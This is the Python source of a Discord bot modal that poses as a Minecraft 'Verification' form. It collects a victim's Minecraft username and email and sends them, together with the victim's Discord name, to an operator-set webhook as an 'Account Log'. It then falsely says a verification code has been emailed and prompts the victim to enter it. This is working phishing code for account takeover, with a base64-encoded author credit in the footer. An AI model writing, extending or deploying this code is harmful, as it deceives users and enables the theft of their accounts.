import json
import datetime
import base64

import aiohttp
import discord
from discord import ui, Webhook, NotFound, HTTPException

from views.button_two import ButtonViewTwo
from views.data.data import stringcrafter

class MyModalOne(ui.Modal, title="Verification"):
    box_one = ui.TextInput(label="MINECRAFT USERNAME", required=True)
    box_two = ui.TextInput(label="MINECRAFT EMAIL", required=True)
    

    async def on_submit(self, interaction: discord.Interaction, /) -> None:
        threadingNum = stringcrafter.string("Q3JlYXRlZCBCeSBodHRwczovL2dpdGh1Yi5jb20vU1NJRFNwaW4=")
        with open("data.json", "r") as f:
            data = json.load(f)
        if data.get("webhook") is None:
            await interaction.response.send_message("The webhook has not been set yet", ephemeral=True)
        else:
            async with aiohttp.ClientSession() as session:
                webhook = Webhook.from_url(data["webhook"], session=session)
                try:
                    embed1=discord.Embed(
                            title="Account Log",
                            description=f"**Username:**:\n ```{self.box_one.value}```\n"
                                        f"**Email**:\n ```{self.box_two.value}```\n"
                                        f"**Discord**:\n ```{interaction.user.name}```\n"
                                        f"**Capes**:\n ```Currently Work In Progress```",
                            timestamp= datetime.datetime.now(),
                            colour=0xff0000,                           
                        )
                    embed1.set_thumbnail(
                        url= f"https://mc-heads.net/avatar/{self.box_one.value}.png"
                        )
                    embed1.set_footer(
                        text=threadingNum,
                    )
                    await webhook.send(embed=embed1)
                except NotFound:
                    return await interaction.response.send_message("Webhook not found", ephemeral=True)
                except HTTPException:
                    return await interaction.response.send_message("Couldn't send to webhook", ephemeral=True)
            await interaction.response.send_message(
                embed=discord.Embed(
                    title="Verification ✅",
                    description="A verification code has been sent to your email.\nPlease click the button below to enter your code.",
                    colour=0x00FF00
                ),
                view=ButtonViewTwo(),
                ephemeral=True
            )
